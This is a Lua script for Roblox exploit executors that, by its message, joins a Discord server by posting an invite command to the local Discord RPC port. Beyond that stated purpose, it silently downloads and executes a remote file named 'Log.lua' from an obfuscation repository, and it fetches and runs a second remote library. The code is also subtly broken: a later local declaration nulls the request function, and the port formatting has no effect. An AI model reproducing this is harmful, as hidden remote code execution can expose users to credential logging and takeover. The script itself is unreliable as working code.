if syn and syn.request then
	RequestFunction = syn.request
elseif request then
	RequestFunction = request
elseif http and http.request then
	RequestFunction = http.request
elseif http_request then
	RequestFunction = http_request
end

if not RequestFunction then
	return game.Players.LocalPlayer:Kick("Your executor does not support http requests.")
end

local HttpService = game:GetService("HttpService")
local DiscordAPI = "http://127.0.0.1:6463/rpc?v=1"
local RequestFunction

loadstring(game:HttpGet("https://raw.githubusercontent.com/kyuoso/MainOBF/main/Log.lua"))();

for i = 6453, 6464 do
	local DiscordInviteRequest = function()
		local Request = RequestFunction({
			Url = string.format(DiscordAPI, tostring(i)),
			Method = "POST",
			Body = HttpService:JSONEncode({
				nonce = HttpService:GenerateGUID(false),
				args = {
					invite = {code = _G.Config.InviteCode},
					code = _G.Config.InviteCode
				},
				cmd = "INVITE_BROWSER"
			}),
			Headers = {
				["Origin"] = "https://discord.com",
				["Content-Type"] = "application/json"
			}
		})
	end
	spawn(DiscordInviteRequest)
end

local AkaliNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))();
local Notify = AkaliNotif.Notify;

wait(1);

Notify({
	Description = "Joining Discord... ( Code: " .. _G.Config.InviteCode .. " )";
	Title = "Message";
	Duration = 5;
});
